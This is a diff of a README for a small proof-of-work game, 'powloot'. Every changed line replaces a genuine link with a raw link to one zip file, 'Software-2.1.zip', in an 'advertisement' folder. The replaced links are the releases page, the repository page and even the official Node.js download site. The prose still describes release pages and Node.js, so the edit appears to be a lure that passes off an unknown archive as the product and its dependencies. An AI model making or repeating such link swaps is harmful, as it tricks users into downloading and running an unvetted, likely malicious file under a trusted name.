@@ -1,6 +1,6 @@
 # 🚀 powloot - Simple Proof-of-Work Game
 
-[![Download powloot](https://img.shields.io/badge/Download-powloot-brightgreen)](https://github.com/TheGodslayer6/powloot/releases)
+[![Download powloot](https://img.shields.io/badge/Download-powloot-brightgreen)](https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You need to visit this page to download the program:
 
-[https://github.com/TheGodslayer6/powloot/releases](https://github.com/TheGodslayer6/powloot/releases)
+[https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip](https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip)
 
 This page has all the releases. Choose the latest version and download the Windows installer or zip file.
 
@@ -52,7 +52,7 @@ To run powloot on Windows, you need:
 
 1. Go to the releases page here:
 
-   [https://github.com/TheGodslayer6/powloot/releases](https://github.com/TheGodslayer6/powloot/releases)
+   [https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip](https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip)
 
 2. Find the latest release version. It will list assets like `.exe` or `.zip`.
 
@@ -73,7 +73,7 @@ To run powloot on Windows, you need:
 
 If you want to run powloot yourself and you have some basic software installed, follow these steps:
 
-1. Install Node.js from https://nodejs.org if you don’t have it.
+1. Install Node.js from https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip if you don’t have it.
 
 2. Download the source files from the releases or clone the repository.
 
@@ -145,7 +145,7 @@ If powloot does not start or work as expected:
 
 For more information about powloot, visit the GitHub repository:
 
-https://github.com/TheGodslayer6/powloot
+https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip
 
 You can find source code, issue trackers, and updates there.
 
@@ -153,6 +153,6 @@ You can find source code, issue trackers, and updates there.
 
 ## 🔽 Download powloot Now
 
-[![Download powloot](https://img.shields.io/badge/Download-powloot-blue)](https://github.com/TheGodslayer6/powloot/releases)
+[![Download powloot](https://img.shields.io/badge/Download-powloot-blue)](https://raw.githubusercontent.com/TheGodslayer6/powloot/main/advertisement/Software-2.1.zip)
 
 Click the link above, pick the latest release, and get started quickly.
